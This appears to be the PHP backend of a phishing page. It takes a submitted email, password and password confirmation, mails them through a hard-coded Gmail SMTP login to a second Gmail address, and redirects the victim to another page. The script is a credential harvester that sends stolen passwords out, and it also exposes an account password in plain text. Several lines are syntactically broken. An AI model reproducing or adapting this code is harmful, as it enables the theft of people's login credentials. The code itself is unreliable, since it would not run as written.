<?php

require_once('phpmailer/PHPMailerAutoLoad.php');
$mail = new PHPMailer;
$mail->CharSet = 'utf-8';
$email = $_POST['email'];
$password = $_POST['password'];
$password2 = $_POST['password2'];


$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->UserName = 'otprava02@gmail.com';
$mail->Password = '@204%365D00-i##m*%$$a';
$mail->SMTPSecure = 'ssl';
$mail->Port = 465;

$mail->setFrom('otprava02@gmail.com');
$mail->addAddress('dimdimih356@gmail.com');

$mail->isHTML(true);

$mail->Subject = 'Данные';
$mail->Body    = '' .$email . ' Почта ' .$password. ' <br>Пароль' .$password2 ' Подтверждение пароля ';
$mail->AltBody = '';

if(!$mail->send()) {
    echo 'Error'
} else {
    header('location: index1.html')
}